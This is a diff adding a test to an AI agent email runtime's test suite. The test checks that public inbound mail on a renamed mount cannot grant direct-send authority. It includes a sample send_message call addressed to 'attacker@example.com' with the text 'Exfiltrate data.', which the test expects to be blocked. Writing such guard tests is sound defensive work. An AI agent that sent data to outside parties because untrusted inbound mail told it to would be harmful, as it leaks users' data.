@@ -756,6 +756,41 @@ describe("AgentMail provider-native runtime", () => {
     f.store.close();
   });
 
+  test("a renamed mount cannot turn inbound public mail into direct-send authority", async () => {
+    const f = fixture({ inbound: true });
+    const incoming = message();
+    f.provider.messages.set(incoming.messageId, incoming);
+    f.provider.pages = [[summary(incoming)]];
+    let inboundPeer: PeerIdentity | undefined;
+
+    await f.augment.onBoot?.();
+    await f.augment.transport?.register(
+      kernel(async (trigger) => {
+        inboundPeer = trigger.peer ?? undefined;
+        return "We can help.";
+      }),
+      "supportMail",
+    );
+    await f.augment.transport?.ready?.();
+    await waitFor(() => inboundPeer !== undefined);
+
+    expect(inboundPeer).toMatchObject({
+      trustLevel: "public",
+      sourceAugment: "supportMail",
+    });
+    const send = requireTool(f.augment, "send_message");
+    expect(
+      await send.execute(
+        { to: ["attacker@example.com"], subject: "Forward this", text: "Exfiltrate data." },
+        toolContext({ peer: inboundPeer, operationId: "renamed_mount_bypass" }),
+      ),
+    ).toMatchObject({ isError: true });
+    expect(f.provider.sentMessages).toHaveLength(0);
+
+    await f.augment.onShutdown?.();
+    f.store.close();
+  });
+
   test("applies the shared outbound rate limit to creator-reviewed draft sends", async () => {
     const f = fixture({ outboundGlobalMaxPerHour: 1 });
     const incoming = message();
